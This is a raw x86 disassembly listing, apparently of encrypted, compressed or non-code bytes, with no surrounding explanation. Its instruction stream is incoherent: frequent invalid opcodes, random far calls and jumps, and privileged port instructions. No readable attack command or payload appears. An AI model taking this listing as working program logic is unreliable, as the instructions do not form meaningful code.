  419a7b:	loop   0x419a2e
  419a7d:	cli    
  419a7e:	call   0x48234d82
  419a83:	xchg   ecx,eax
  419a84:	or     DWORD PTR [edi],edx
  419a86:	dec    ebp
  419a87:	or     al,0x42
  419a89:	or     ebx,ecx
  419a8b:	mov    ch,0x17
  419a8d:	mov    bh,0xcb
  419a8f:	mov    ebp,0x34ef2d0f
  419a94:	ret    0x9a33
  419a97:	push   0xffffffd6
  419a99:	push   0x6e
  419a9b:	pop    es
  419a9c:	fcom   DWORD PTR [esi+0x1f6fa778]
  419aa2:	ss popf 
  419aa4:	dec    ebp
  419aa5:	mov    ah,0xe8
  419aa7:	pop    ss
  419aa8:	mov    ch,0xa6
  419aaa:	push   es
  419aab:	xor    BYTE PTR [eax-0x2b4295d9],dh
  419ab1:	mov    edx,0x3f8398ef
  419ab6:	sbb    eax,0x33545261
  419abb:	pop    ss
  419abc:	shl    BYTE PTR ds:0xd9b6fda3,cl
  419ac2:	jl     0x419b29
  419ac4:	cwde   
  419ac5:	outs   dx,DWORD PTR ds:[esi]
  419ac6:	pop    edx
  419ac7:	dec    esp
  419ac8:	loope  0x419a87
  419aca:	shl    DWORD PTR [edi+0x5a8379bd],0x35
  419ad1:	(bad)  
  419ad2:	int3   
  419ad3:	int3   
  419ad4:	pop    esi
  419ad5:	lds    ebx,FWORD PTR [edx+0x3fb7137b]
  419adb:	lock je 0x419aba
  419ade:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  419ae0:	pop    ecx
  419ae1:	inc    edi
  419ae2:	add    esi,DWORD PTR [edx+0x1b]
  419ae5:	inc    ebx
  419ae6:	jns    0x419ad0
  419ae8:	mov    dl,0x55
  419aea:	imul   DWORD PTR ds:0xca873
  419af0:	or     BYTE PTR [edi-0x4c],dh
  419af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af4:	dec    ebp
  419af5:	mov    ds:0xfb6ac59c,eax
  419afa:	dec    esi
  419afb:	mov    ecx,0x3f57b0b3
  419b00:	lea    ebp,[eax]
  419b02:	push   esi
  419b03:	dec    edx
  419b04:	dec    edx
  419b05:	pop    edx
  419b06:	push   eax
  419b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b08:	mov    eax,ds:0xe69a5c1f
  419b0d:	adc    al,0x42
  419b0f:	jle    0x419a9b
  419b11:	jmp    ebx
  419b13:	jg     0x419adc
  419b15:	jp     0x419aab
  419b17:	cmp    DWORD PTR [edx+esi*8-0x65],eax
  419b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b1d:	in     eax,0xdc
  419b1f:	inc    ecx
  419b20:	jns    0x419b2d
  419b22:	push   ds
  419b23:	aam    0xe8
  419b25:	inc    eax
  419b26:	fistp  QWORD PTR [ebx+eiz*8]
  419b29:	sub    al,0x9b
  419b2b:	add    eax,0x4dedf79d
  419b30:	aas    
  419b31:	loopne 0x419ba1
  419b33:	inc    ebp
  419b34:	push   es
  419b35:	or     ebp,DWORD PTR [ebp-0x56b7518a]
  419b3b:	loopne 0x419ae5
  419b3d:	call   0xaf5469df
  419b42:	mov    bh,0xc9
  419b44:	push   edx
  419b45:	je     0x419b32
  419b47:	sti    
  419b48:	fisttp QWORD PTR [ebx]
  419b4a:	fwait
  419b4b:	dec    esi
  419b4c:	pop    esi
  419b4d:	retf   0x128a
  419b50:	mov    cl,0x87
  419b52:	cdq    
  419b53:	out    0xbc,al
  419b55:	jne    0x419b23
  419b57:	cdq    
  419b58:	add    al,BYTE PTR [edx+eax*1]
  419b5b:	ins    BYTE PTR es:[edi],dx
  419b5c:	and    BYTE PTR [edi],ch
  419b5e:	mov    edx,0x159317f3
  419b63:	test   DWORD PTR [edx-0x1a7ed1c5],esi
  419b69:	mov    WORD PTR [eax],?
  419b6b:	pop    ebx
  419b6c:	js     0x419b79
  419b6e:	sbb    ebx,edi
  419b70:	ss dec ecx
  419b72:	cmc    
  419b73:	push   ds
  419b74:	cwde   
  419b75:	fisttp QWORD PTR [ebp+0x36f61f5c]
  419b7b:	call   0x4785:0x6745d9b2
  419b82:	dec    esi
  419b83:	in     al,0x8c
  419b85:	es in  al,dx
  419b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b88:	sbb    eax,0x8c4aea9a
  419b8d:	dec    ebx
  419b8e:	mov    dl,BYTE PTR [edi-0x127f473]
  419b94:	xchg   esp,eax
  419b95:	cs xchg ebp,eax
  419b97:	xchg   DWORD PTR [esi],eax
  419b99:	sub    DWORD PTR [edx+0x48df29],ebx
  419b9f:	push   ds
  419ba0:	pop    ebp
  419ba1:	out    0x47,eax
  419ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba4:	jo     0x419b2f
  419ba6:	clc    
  419ba7:	in     eax,dx
  419ba8:	sub    DWORD PTR [eax+ebx*4+0x66dfbdf5],esi
  419baf:	mov    bh,0xfb
  419bb1:	dec    ebx
  419bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb3:	xchg   edi,eax
  419bb4:	cmp    BYTE PTR [ebx+0x99a75f],bh
  419bba:	mov    ecx,0xfd36beed
  419bbf:	mov    ?,WORD PTR [edx+0x34c88c6d]
  419bc5:	lahf   
  419bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc7:	add    ecx,0x6fa8de0b
  419bcd:	xor    eax,0x19634851
  419bd2:	in     al,0x7e
  419bd4:	mov    cl,0x67
  419bd6:	push   DWORD PTR [ecx]
  419bd8:	push   ecx
  419bd9:	icebp  
  419bda:	add    BYTE PTR [edi-0x10],dh
  419bdd:	pusha  
  419bde:	lock pop ebp
  419be0:	jae    0x419bea
  419be2:	int    0x67
  419be4:	or     eax,0x13ad1089
  419be9:	mov    esp,0x4ff8d779
  419bee:	call   0x1bfa:0x4d926365
  419bf5:	ret    0x4df8
  419bf8:	push   esp
  419bf9:	or     ecx,DWORD PTR [eax-0x6f]
  419bfc:	inc    ecx
  419bfd:	mov    cl,0xe2
  419bff:	pushf  
  419c00:	stc    
  419c01:	cmp    DWORD PTR [edx-0x559ca4d5],ebx
  419c07:	push   esi
  419c08:	push   0x10
  419c0a:	test   eax,0x6e4762a6
  419c0f:	mov    eax,ds:0x7bcfa56f
  419c14:	inc    ecx
  419c15:	(bad)  
  419c16:	fwait
  419c17:	sahf   
  419c18:	dec    ebp
  419c19:	cmc    
  419c1a:	int3   
  419c1b:	aaa    
  419c1c:	in     eax,dx
  419c1d:	shr    DWORD PTR [esi+0x25],1
  419c20:	cdq    
  419c21:	sti    
  419c22:	and    BYTE PTR [edi+0x23f43033],0xbc
  419c29:	cmp    ch,ah
  419c2b:	popa   
  419c2c:	mov    dl,0xfb
  419c2e:	stos   BYTE PTR es:[edi],al
  419c2f:	mov    ecx,0xff42b01c
  419c34:	pop    edx
  419c35:	ja     0x419bdb
  419c37:	mov    ah,0x38
  419c39:	xor    al,0xa8
  419c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c3c:	and    DWORD PTR [ebx+edi*4+0x11],esi
  419c40:	inc    ebp
  419c41:	(bad)  
  419c42:	call   0xa94d:0x8c6863ad
  419c49:	xchg   esi,eax
  419c4a:	dec    edx
  419c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c4c:	and    ebp,DWORD PTR [ecx]
  419c4e:	(bad)  
  419c4f:	and    DWORD PTR [ebp-0x4dbd463d],esp
  419c55:	dec    edx
  419c56:	mov    bl,0x28
  419c58:	mov    bh,0x65
  419c5a:	sahf   
  419c5b:	gs jmp 0x7ea1:0x3ca799e9
  419c63:	xchg   esi,eax
  419c64:	mov    ebx,0xea3e6e71
  419c69:	xchg   ebp,eax
  419c6a:	and    BYTE PTR [edi+0x6bbda4a6],0x13
  419c71:	xchg   esi,eax
  419c72:	cmc    
  419c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c74:	(bad)  
  419c75:	sbb    BYTE PTR [edi-0x37b5b534],ch
  419c7b:	push   ss
  419c7c:	push   esi
  419c7d:	stos   DWORD PTR es:[edi],eax
  419c7e:	call   0x44ae:0x40af4296
  419c85:	dec    ebp
  419c86:	cmp    DWORD PTR [edi+0x1a58def8],esp
  419c8c:	pop    ebx
  419c8d:	cdq    
  419c8e:	popa   
  419c8f:	es mov dl,0xa5
  419c92:	out    0xa6,eax
  419c94:	jp     0x419cfa
  419c96:	clc    
  419c97:	lahf   
  419c98:	popa   
  419c99:	or     eax,DWORD PTR [esi]
  419c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c9c:	xor    DWORD PTR [esi+0xccb8bc3],esp
  419ca2:	call   0xed0b:0x31e0e6af
  419ca9:	ja     0x419cc0
  419cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cac:	repnz lea eax,ds:0x6b9771c5
  419cb3:	inc    edx
  419cb4:	mov    bl,0x44
  419cb6:	inc    edi
  419cb7:	xlat   BYTE PTR ds:[ebx]
  419cb8:	repz sub ebx,DWORD PTR [edx+0x1]
  419cbc:	pop    esp
  419cbd:	dec    ebx
  419cbe:	inc    ebx
  419cbf:	pop    ebx
  419cc0:	movlhps xmm6,xmm7
  419cc3:	imul   eax,DWORD PTR [ecx-0x35],0x44
  419cc7:	and    eax,0xfdaf16d2
  419ccc:	mov    dl,0x84
  419cce:	fsubr  QWORD PTR [ebp-0x51e5df3a]
  419cd4:	mov    al,ds:0x7b7da317
  419cd9:	dec    edx
  419cda:	pop    es
  419cdb:	and    dl,BYTE PTR [eax-0x51]
  419cde:	div    DWORD PTR [eax+0x12]
  419ce1:	repnz hlt 
  419ce3:	test   DWORD PTR [ecx+eiz*4-0x1a6cb07b],edi
  419cea:	pusha  
  419ceb:	inc    esi
  419cec:	jmp    0x42b4506f
  419cf1:	(bad)  
  419cf2:	jnp    0x419c9b
  419cf4:	(bad)  
  419cf5:	cmp    edi,DWORD PTR [ebx]
  419cf7:	fst    st(2)
  419cf9:	pop    ecx
  419cfa:	ins    DWORD PTR es:[edi],dx
  419cfb:	stc    
  419cfc:	jmp    0x8ac3:0x5a78288
  419d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d05:	into   
  419d06:	xchg   bl,ch
  419d08:	bound  ebx,QWORD PTR [edi]
  419d0a:	test   ch,bl
  419d0c:	mov    ah,0x8b
  419d0e:	xchg   ecx,eax
  419d0f:	mov    ?,WORD PTR [esp+eiz*8-0x2e4d4a22]
  419d16:	lods   al,BYTE PTR ds:[esi]
  419d17:	mov    ds:0xf1e837e0,al
  419d1c:	ja     0x419d2a
  419d1e:	fcmovbe st,st(6)
  419d20:	stc    
  419d21:	mov    DWORD PTR [edi+esi*8+0x62],edx
  419d25:	xchg   edx,eax
  419d26:	dec    esp
  419d27:	addr16 mov ch,0xbf
  419d2a:	inc    edx
  419d2b:	out    0xdd,al
  419d2d:	ds fs daa 
  419d30:	(bad)  
  419d31:	mov    eax,0x15fbfb32
  419d36:	fild   QWORD PTR [ecx-0x4f]
  419d39:	retf   
  419d3a:	stos   DWORD PTR es:[edi],eax
  419d3b:	stos   DWORD PTR es:[edi],eax
  419d3c:	adc    al,0x9a
  419d3e:	into   
  419d3f:	push   0xffffffae
  419d41:	out    0x83,eax
  419d43:	pop    ss
  419d44:	xor    eax,0x122898d4
  419d49:	clc    
  419d4a:	add    DWORD PTR ds:0x4cbc0b25,edi
  419d50:	out    dx,eax
  419d51:	fwait
  419d52:	call   0xa80b3e46
  419d57:	or     BYTE PTR [edi+0xb],0x72
  419d5b:	jp     0x419dc4
  419d5d:	fcomp  DWORD PTR [ecx+0x6c]
  419d60:	cmp    eax,0x4195b20a
  419d65:	(bad)  
  419d67:	jecxz  0x419d4c
  419d69:	test   ecx,0x221bb34b
  419d6f:	sub    ecx,DWORD PTR [esi+0x46]
  419d72:	stos   DWORD PTR es:[edi],eax
  419d73:	in     al,dx
  419d74:	push   0x26
  419d76:	push   ecx
  419d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d78:	lea    edx,[ebx+0x1d]
  419d7b:	pop    edi
  419d7c:	pop    es
  419d7d:	push   es
  419d7e:	jge    0x419df2
  419d80:	mov    ?,WORD PTR [eax-0x63eed8e6]
  419d86:	leave  
  419d87:	lods   al,BYTE PTR ds:[esi]
  419d88:	sub    ebx,DWORD PTR [edx-0x6f935dce]
  419d8e:	imul   esi,ebx,0x48
  419d91:	mov    bl,BYTE PTR [esi+0x1e]
  419d94:	jne    0x419e11
  419d96:	mov    ebx,0x96befe0b
  419d9b:	aam    0xb1
  419d9d:	inc    eax
  419d9e:	fs ret 0x380c
  419da2:	int3   
  419da3:	aas    
  419da4:	popa   
  419da5:	xchg   DWORD PTR [edi+eiz*4],ecx
  419da8:	mov    ch,BYTE PTR [edx-0x3b]
  419dab:	or     ebp,DWORD PTR [ecx]
  419dad:	(bad)
  419db0:	rol    DWORD PTR [edx-0x5c],0x76
  419db4:	ja     0x419dc1
  419db6:	outs   dx,DWORD PTR ds:[esi]
  419db7:	push   0x19
  419db9:	xchg   BYTE PTR [ecx-0x6f],al
  419dbc:	add    BYTE PTR [edx+ebx*1-0x609c6985],dl
  419dc3:	dec    esi
  419dc4:	mov    dl,0x7c
  419dc6:	jne    0x419e35
  419dc8:	scas   al,BYTE PTR es:[edi]
  419dc9:	in     al,dx
  419dca:	pushf  
  419dcb:	pop    ebp
  419dcc:	iret   
  419dcd:	or     al,0xb5
  419dcf:	jbe    0x419e31
  419dd1:	push   esi
  419dd2:	out    dx,al
  419dd3:	adc    bh,al
  419dd5:	mov    cl,BYTE PTR [ecx]
  419dd7:	jmp    0xfcb2:0xc105eb8d
  419dde:	arpl   WORD PTR [ebx+0x6b97d9a],bx
  419de4:	xor    al,0x9
  419de6:	inc    esi
  419de7:	outs   dx,DWORD PTR ds:[esi]
  419de8:	pop    edi
  419de9:	mov    eax,0x57727e0b
  419dee:	cmp    al,BYTE PTR [eax]
  419df0:	mov    bh,0xd3
  419df2:	jne    0x419e43
  419df4:	call   0x2cafb27
  419df9:	sbb    DWORD PTR [ebx],ebx
  419dfb:	out    0xfb,eax
  419dfd:	test   DWORD PTR [ebx-0x59],0x316ee723
  419e04:	lock repnz add ah,dl
  419e08:	and    dl,BYTE PTR [edx]
  419e0a:	call   0xa462:0xe1cfe0da
  419e11:	mov    eax,0xb00ca6c4
  419e16:	loopne 0x419e26
  419e18:	mov    bh,0xd3
  419e1a:	call   0xe5730be6
  419e1f:	inc    esp
  419e20:	mov    al,ds:0xb7f34754
  419e25:	sbb    eax,0x88b24368
  419e2a:	add    BYTE PTR [ebp-0x51],cl
  419e2d:	jae    0x419e74
  419e2f:	mov    al,ds:0x5bb2aff6
  419e34:	adc    BYTE PTR [ebx-0x6679a3bf],ch
  419e3a:	call   0x7ce5:0x6c30adbf
  419e41:	or     eax,0xd974b98c
  419e46:	mov    ecx,0x1f1b3a27
  419e4b:	int3   
  419e4c:	mov    edx,0x25749958
  419e51:	(bad)  
  419e52:	ja     0x419de4
  419e54:	jns    0x419e09
  419e56:	pop    ebp
  419e57:	outs   dx,BYTE PTR ds:[esi]
  419e58:	xchg   ecx,eax
  419e59:	or     al,0xb7
  419e5b:	mov    ds:0xc868bd23,eax
  419e60:	jb     0x419e6e
  419e62:	test   cl,ah
  419e64:	pop    es
  419e65:	scas   eax,DWORD PTR es:[edi]
  419e66:	call   0x24d8:0xf14e3cc2
  419e6d:	pop    edx
  419e6e:	and    al,0xa6
  419e70:	push   0x1a76439f
  419e75:	mov    ebx,0x6ae4fb6
  419e7a:	push   0xffffffa1
  419e7c:	mov    dl,0x41
  419e7e:	cmp    eax,0x38bcf1f4
  419e83:	into   
  419e84:	push   0xd0bc2c0b
  419e89:	test   al,0x5e
  419e8b:	test   BYTE PTR [esi+0x25ad9a19],0x4f
  419e92:	shr    BYTE PTR [ecx+ecx*4+0x68a72a80],cl
  419e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e9a:	or     al,0x2d
  419e9c:	pop    ebx
  419e9d:	mov    WORD PTR [edi],fs
  419e9f:	cdq    
  419ea0:	mov    ch,0x1a
  419ea2:	repz mov al,0x85
  419ea5:	dec    ebx
  419ea6:	in     al,0xc6
  419ea8:	adc    al,0x99
  419eaa:	and    eax,0x59c56287
  419eaf:	mov    al,ds:0x3e88f6a9
  419eb4:	icebp  
  419eb5:	mov    ebx,0x37bc4a3d
  419eba:	shl    BYTE PTR [edi],cl
  419ebc:	fimul  DWORD PTR [ebx]
  419ebe:	cs je  0x419f25
  419ec1:	leave  
  419ec2:	sub    edx,0x33
  419ec5:	add    eax,0xd5c0585e
  419eca:	fiadd  DWORD PTR [edi-0x12]
  419ecd:	inc    esp
  419ece:	mov    edx,cr6
  419ed1:	mov    gs,WORD PTR [edi]
  419ed3:	mov    edx,0x8bf01d6d
  419ed8:	es or  eax,edi
  419edb:	jge    0x419ed4
  419edd:	mov    ch,0x17
  419edf:	outs   dx,DWORD PTR ds:[esi]
  419ee0:	fsubr  QWORD PTR [esi-0x23754766]
  419ee6:	dec    ebx
  419ee7:	push   DWORD PTR [ebx+ebx*8-0x11]
  419eeb:	dec    eax
  419eed:	xchg   DWORD PTR gs:[esi+eiz*2+0x7b],esi
  419ef2:	xchg   esp,eax
  419ef3:	adc    esi,DWORD PTR [ebx]
  419ef5:	ficomp WORD PTR [edx-0x4b644fa0]
  419efb:	test   DWORD PTR [ecx+0x3b],edx
  419efe:	inc    eax
  419eff:	mov    al,ds:0x4506eef5
  419f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f05:	pop    ebx
  419f06:	xchg   esi,eax
  419f07:	jbe    0x419f7f
  419f09:	cdq    
  419f0a:	call   0xb7d1:0xbd54bd46
  419f11:	adc    BYTE PTR [ebx+ebx*8-0x2b],cl
  419f15:	or     ebx,DWORD PTR [ebp-0xbf63105]
  419f1b:	(bad)  
  419f1c:	out    dx,eax
  419f1d:	(bad)  
  419f1e:	jp     0x419f52
  419f20:	mov    dl,0x2b
  419f22:	xchg   esp,eax
  419f23:	inc    esi
  419f24:	pop    edi
  419f25:	mov    ch,0xd3
  419f27:	pusha  
  419f28:	sbb    BYTE PTR [ebx],cl
  419f2a:	dec    esi
  419f2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2c:	xor    DWORD PTR [ebx+0x1c51119c],eax
  419f32:	xchg   ebp,eax
  419f33:	arpl   WORD PTR [eax+0x77c06b55],di
  419f39:	fisttp DWORD PTR [ebp+0x46a1125b]
  419f3f:	push   edx
  419f40:	retf   0x79f9
  419f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f44:	or     eax,0x40945084
  419f49:	lea    eax,[edx-0x43cf4df0]
  419f4f:	pop    ecx
  419f50:	jge    0x419f9f
  419f52:	les    ebx,FWORD PTR [edi-0x39]
  419f55:	or     bl,dl
  419f57:	(bad)  
  419f58:	add    ah,BYTE PTR [ebx-0x57]
  419f5b:	cmp    esi,DWORD PTR [edx+0x77567fcf]
  419f61:	sbb    DWORD PTR [eax-0x5deba3e5],edi
  419f67:	adc    eax,0xbbdb2f61
  419f6c:	stc    
  419f6d:	test   DWORD PTR [esi],eax
  419f6f:	sar    BYTE PTR [eax],0x69
  419f72:	cmp    eax,0xa38b3bb9
  419f77:	test   eax,0xc1a4fc9
  419f7c:	mov    bl,0xe9
  419f7e:	out    dx,al
  419f7f:	xchg   ecx,eax
  419f80:	or     BYTE PTR [ecx],cl
  419f82:	jne    0x419f61
  419f84:	pop    esi
  419f85:	loopne 0x419fcb
  419f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f88:	stos   BYTE PTR es:[edi],al
  419f89:	out    0x88,eax
  419f8b:	cld    
  419f8c:	nop
  419f8d:	std    
  419f8e:	mov    ds:0x4ccb23a,al
  419f93:	(bad)  
  419f94:	clc    
  419f95:	jp     0x419f23
  419f97:	(bad)
  419f9a:	jb     0x419fbd
  419f9c:	jmp    0x419f21
  419f9e:	or     DWORD PTR ds:0x9e9a220c,0xffffffac
  419fa5:	cdq    
  419fa6:	mov    ch,0x7a
  419fa8:	mov    al,0x4f
  419faa:	xchg   edx,eax
  419fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fac:	in     eax,0x9b
  419fae:	(bad)  
  419faf:	pop    edx
  419fb0:	sub    al,0xa5
  419fb2:	iret   
  419fb3:	out    0x0,al
  419fb5:	call   0xd0afb0c
  419fba:	scas   al,BYTE PTR es:[edi]
  419fbb:	jno    0x419f9e
  419fbd:	xchg   edi,eax
  419fbe:	lahf   
  419fbf:	xchg   DWORD PTR [ecx-0x4de2ddbe],edi
  419fc5:	and    ch,BYTE PTR [edx]
  419fc7:	(bad)  [edx+0x34]
  419fca:	das    
  419fcb:	pop    ebx
  419fcc:	cmp    esi,DWORD PTR [edi]
  419fce:	xor    eax,0x8976b9b5
  419fd3:	xor    dh,BYTE PTR [edx]
  419fd5:	jg     0x419fae
  419fd7:	stos   DWORD PTR es:[edi],eax
  419fd8:	rcr    ebx,0x9a
  419fdb:	ins    DWORD PTR es:[edi],dx
  419fdc:	leave  
  419fdd:	mov    dl,0x84
  419fdf:	and    eax,0xa7674dd3
  419fe4:	xchg   BYTE PTR [edi+ecx*2-0x74],al
  419fe8:	imul   ebx,DWORD PTR [ebx-0x17],0x5b
  419fec:	leave  
  419fed:	cmp    BYTE PTR [edx-0x77da9f39],bl
  419ff3:	(bad)  
  419ff4:	pop    ebx
  419ff5:	mov    ds:0xea8a928,al
  419ffa:	repz dec esp
  419ffc:	push   edx
  419ffd:	push   ecx
  419ffe:	xor    eax,0x9130a7ab
  41a003:	ss or  eax,0x78a7d40a
  41a009:	scas   eax,DWORD PTR es:[edi]
  41a00a:	loopne 0x419f9c
  41a00c:	mov    ds:0x584f4f0b,al
  41a011:	mov    DWORD PTR [edx-0x1d],ebx
  41a014:	and    edi,eax
  41a016:	call   0x8839:0x7e5040ad
  41a01d:	push   ds
  41a01e:	mov    bl,0xa4
  41a020:	mov    ebx,0xe323e504
  41a025:	dec    ebp
  41a026:	inc    edx
  41a027:	mov    ah,0x6
  41a029:	inc    eax
  41a02a:	call   0x9c12:0x26a3e984
  41a031:	mov    dl,BYTE PTR [esi-0x59]
  41a034:	jnp    0x41a09a
  41a036:	add    ecx,DWORD PTR [ebx-0x19]
  41a039:	mov    ecx,0xd3b2182a
  41a03e:	out    dx,eax
  41a03f:	retf   0x16dc
  41a042:	int3   
  41a043:	pop    ebx
  41a044:	(bad)  [ebx]
  41a046:	pop    es
  41a047:	ss jmp 0x8650:0x1b55cffb
  41a04f:	add    ah,BYTE PTR [edx]
  41a051:	call   0x671eee70
  41a056:	ja     0x41a013
  41a058:	dec    ebp
  41a059:	or     edx,eax
  41a05b:	loop   0x41a001
  41a05d:	pop    ds
  41a05e:	pop    ecx
  41a05f:	ficom  DWORD PTR [edi]
  41a061:	rcr    DWORD PTR [edx-0x6626dbf5],0xf4
  41a068:	mov    BYTE PTR [ebp-0x401058b7],0xbf
  41a06f:	xchg   DWORD PTR [ebp-0x524de292],ebp
  41a075:	out    0xa6,al
  41a077:	mov    edx,0x993341f2
  41a07c:	add    eax,0x39a068c8
  41a081:	xchg   DWORD PTR [esi+esi*4+0xfe2abc9],esi
  41a088:	ret    0x9abe
  41a08b:	push   ss
  41a08c:	mov    eax,0xe900a3fb
  41a091:	mov    eax,ds:0x9a3267de
  41a096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a097:	leave  
  41a098:	xor    esi,eax
  41a09a:	xchg   ebp,eax
  41a09b:	aaa    
  41a09c:	push   ss
  41a09d:	sub    BYTE PTR [edi],bl
  41a09f:	fdiv   st,st(2)
  41a0a1:	cld    
  41a0a2:	inc    eax
  41a0a3:	sub    DWORD PTR gs:[esi-0x1b],edi
  41a0a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a8:	cmp    al,0xd7
  41a0aa:	jle    0x41a048
  41a0ac:	mov    edx,0xb22c0cf1
  41a0b1:	mov    ds,WORD PTR [edi+0x5a]
  41a0b4:	(bad)  
  41a0b6:	inc    ebx
  41a0b7:	mov    bl,0xe2
  41a0b9:	or     edi,DWORD PTR [esi+ebx*2+0x16]
  41a0bd:	out    dx,eax
  41a0be:	mov    esp,0x99a91c9f
  41a0c3:	jge    0x41a121
  41a0c5:	(bad)  
  41a0c6:	sbb    eax,edx
  41a0c8:	sub    DWORD PTR [ebx+0xb78fc90],esp
  41a0ce:	push   ebx
  41a0cf:	adc    eax,0xca548624
  41a0d4:	cmp    cl,BYTE PTR [ecx]
  41a0d6:	call   0xe6ce:0x477b95dc
  41a0dd:	mov    ebx,0x1634a71f
  41a0e2:	sbb    ebp,DWORD PTR [eax]
  41a0e4:	lea    esi,[eax+0x4d948c97]
  41a0ea:	daa    
  41a0eb:	jecxz  0x41a09f
  41a0ed:	mov    edi,0x73a4835
  41a0f2:	cli    
  41a0f3:	inc    ebp
  41a0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f5:	or     ebx,DWORD PTR [eax-0x379be409]
  41a0fb:	in     eax,0x8d
  41a0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0fe:	call   0x299f:0x398f3083
  41a105:	and    al,0x57
  41a107:	aas    
  41a108:	mov    WORD PTR [ebx],cs
  41a10a:	sti    
  41a10b:	mov    bh,0x8c
  41a10d:	pop    ss
  41a10e:	sub    BYTE PTR [eax+ebp*4],cl
  41a111:	fstp   DWORD PTR [ebp-0x39c3a625]
  41a117:	mov    ah,0xe2
  41a119:	pusha  
  41a11a:	mov    dh,0x12
  41a11c:	lea    ecx,[ebx]
  41a11e:	push   ebx
  41a11f:	sbb    eax,DWORD PTR [edx+eax*2+0x59e420a3]
  41a126:	je     0x41a0e6
  41a128:	mov    dl,0x1a
  41a12a:	inc    eax
  41a12b:	fdivr  DWORD PTR [ebp-0x5d]
  41a12e:	mov    BYTE PTR [ebp-0x641fea8a],cl
  41a134:	ins    BYTE PTR es:[edi],dx
  41a135:	or     ebx,DWORD PTR [ebp+0x6e4f3470]
  41a13b:	mov    dh,BYTE PTR [edx-0x4bbafc27]
  41a141:	sbb    ah,dl
  41a143:	out    0x3c,eax
  41a145:	cmc    
  41a146:	xchg   esi,eax
  41a147:	cwde   
  41a148:	jmp    0xbaf7:0x5dea94d6
  41a14f:	jns    0x41a0d1
  41a151:	pop    ebp
  41a152:	xor    eax,0xf4bab29e
  41a157:	ds (bad) 
  41a159:	mov    ah,0xd9
  41a15b:	xor    DWORD PTR ds:0x6c1dd576,eax
  41a161:	add    eax,0xf302f81a
  41a166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a168:	jnp    0x41a18a
  41a16a:	dec    ebx
  41a16b:	push   ds
  41a16c:	push   ebp
  41a16d:	jp     0x41a109
  41a16f:	adc    bh,BYTE PTR [edi+edi*4]
  41a172:	(bad)
  41a176:	xchg   esi,eax
  41a177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a178:	and    DWORD PTR [ebx-0x35bbd290],0x23
  41a17f:	fs mov dl,0xc7
  41a182:	xor    BYTE PTR [ebp-0x7b03fab5],bh
  41a188:	push   eax
  41a189:	adc    al,0x5f
  41a18b:	mov    bl,0x7d
  41a18d:	mov    edx,DWORD PTR [edx+edx*8-0x25]
  41a191:	adc    eax,0xbbb5b0c6
  41a196:	mov    ebp,0xfa3eea50
  41a19b:	hlt    
  41a19c:	and    edx,DWORD PTR [ebp+0x29]
  41a19f:	pop    edi
  41a1a0:	push   edi
  41a1a1:	or     BYTE PTR [edi+0x11],dh
  41a1a4:	fdiv   st,st(5)
  41a1a6:	pop    es
  41a1a7:	and    eax,0x3b9015b2
  41a1ac:	jl     0x41a16a
  41a1ae:	test   eax,0x370bd7d7
  41a1b3:	pop    ds
  41a1b4:	(bad)  
  41a1b5:	int3   
  41a1b6:	dec    ebx
  41a1b7:	ss es int 0x9a
  41a1bb:	mov    WORD PTR [edi-0x10f7e36c],?
  41a1c1:	addr16 loop 0x41a16b
  41a1c4:	or     esp,DWORD PTR [esi-0x6b]
  41a1c7:	push   ebx
  41a1c8:	sldt   eax
  41a1cb:	or     eax,0x87d913b2
  41a1d0:	sub    eax,DWORD PTR [edx+0x1a]
  41a1d3:	xor    al,0xd3
  41a1d5:	js     0x41a1bf
  41a1d7:	mov    edx,0x2756ad2c
  41a1dc:	xor    esi,ecx
  41a1de:	fwait
  41a1df:	xchg   ecx,eax
  41a1e0:	pop    ds
  41a1e1:	dec    ebx
  41a1e2:	mov    ds:0x59b1d473,al
  41a1e7:	xor    BYTE PTR [esi-0x30],dh
  41a1ea:	test   ebp,edi
  41a1ec:	repnz call 0xa77e:0xaeab7bfa
  41a1f4:	and    DWORD PTR [ebx+0x7],ebx
  41a1f7:	push   0xde332a37
  41a1fc:	mov    bh,0xa5
  41a1fe:	dec    edx
  41a1ff:	xor    DWORD PTR [esi+0x48c05b76],0xffffffea
  41a206:	inc    edx
  41a207:	xor    BYTE PTR [eax],bh
  41a209:	jge    0x41a1ea
  41a20b:	pop    edi
  41a20c:	mov    bh,0xb
  41a20e:	les    ebx,FWORD PTR [ebx+0x584b8aed]
  41a214:	mov    ds:0xc5869abd,eax
  41a219:	test   eax,0x3bcdc213
  41a21e:	xstore-rng (bad)
